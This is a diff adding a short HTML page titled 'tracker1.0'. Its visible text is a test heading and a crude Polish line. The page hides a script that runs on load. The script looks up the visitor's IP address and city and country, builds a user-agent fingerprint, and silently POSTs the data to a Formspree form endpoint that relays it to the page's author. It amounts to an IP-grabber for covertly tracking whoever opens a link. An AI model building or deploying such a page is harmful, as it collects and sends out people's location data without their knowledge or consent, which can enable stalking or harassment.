@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>tracker1.0</title>
+</head>
+<body>
+  <h1>test</h1>
+  <p>poka cyce</p>
+  <script>
+    // Pobieranie danych o IP, lokalizacji, user agent itd.
+    async function getData() {
+      const ipData = await fetch('https://api.ipify.org?format=json').then(response => response.json());
+      const locationData = await fetch(`https://ipinfo.io/${ipData.ip}/json`).then(response => response.json());
+
+      const userAgent = navigator.userAgent;
+      const fingerprint = btoa(navigator.userAgent + Date.now()); // fingerprint
+
+      // Zbieranie danych
+      const data = {
+        ip: ipData.ip,
+        location: locationData.city + ", " + locationData.country,
+        userAgent: userAgent,
+        fingerprint: fingerprint
+      };
+
+      // Wyświetlanie danych w konsoli (do debugowania)
+      console.log(data);
+
+      // Wysyłanie danych na email (tutaj trzeba użyć serwera backendowego lub innej usługi)
+      await fetch('https://formspree.io/f/xjkyelzd', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      });
+    }
+
+    getData();
+  </script>
+</body>
+</html>
